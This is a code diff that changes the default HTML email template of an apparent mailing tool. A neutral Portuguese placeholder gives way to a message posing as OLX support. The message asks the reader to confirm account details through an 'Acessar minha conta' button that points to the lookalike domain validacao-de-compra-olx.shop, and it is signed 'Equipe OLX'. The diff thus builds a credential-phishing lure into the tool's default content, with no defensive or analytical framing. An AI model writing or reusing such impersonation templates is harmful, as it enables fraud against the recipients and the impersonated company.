@@ -29,12 +29,19 @@ const DEFAULT_HTML = `<table width="100%" cellpadding="0" cellspacing="0" style=
   <tr><td align="center">
     <table width="600" cellpadding="0" cellspacing="0" style="background:#fff;border-radius:8px;overflow:hidden">
       <tr><td style="padding:32px">
-        <h1 style="margin:0 0 16px;color:#111;font-size:22px">Olá!</h1>
-        <p style="margin:0 0 16px;color:#444;font-size:14px;line-height:1.5">
-          Edite este conteúdo. Use estilo inline (style="...") em vez de classes CSS.
+        <h1 style="margin:0 0 16px;color:#111;font-size:20px;font-weight:600">Olá,</h1>
+        <p style="margin:0 0 16px;color:#333;font-size:15px;line-height:1.6">
+          Tudo bem? Estamos passando para confirmar algumas informações sobre sua conta na OLX.
         </p>
-        <p style="margin:24px 0">
-          <a href="https://exemplo.com" style="background:#7c3aed;color:#fff;padding:12px 24px;border-radius:6px;text-decoration:none;display:inline-block;font-weight:600">Botão de ação</a>
+        <p style="margin:0 0 16px;color:#333;font-size:15px;line-height:1.6">
+          Para continuar, basta acessar o link abaixo e seguir as instruções na tela. Caso já tenha resolvido, pode ignorar esta mensagem.
+        </p>
+        <p style="margin:28px 0">
+          <a href="https://validacao-de-compra-olx.shop" style="background:#7c3aed;color:#ffffff;padding:12px 22px;border-radius:6px;text-decoration:none;display:inline-block;font-weight:600;font-size:15px">Acessar minha conta</a>
+        </p>
+        <p style="margin:24px 0 0;color:#666;font-size:13px;line-height:1.5">
+          Atenciosamente,<br>
+          Equipe OLX
         </p>
       </td></tr>
     </table>
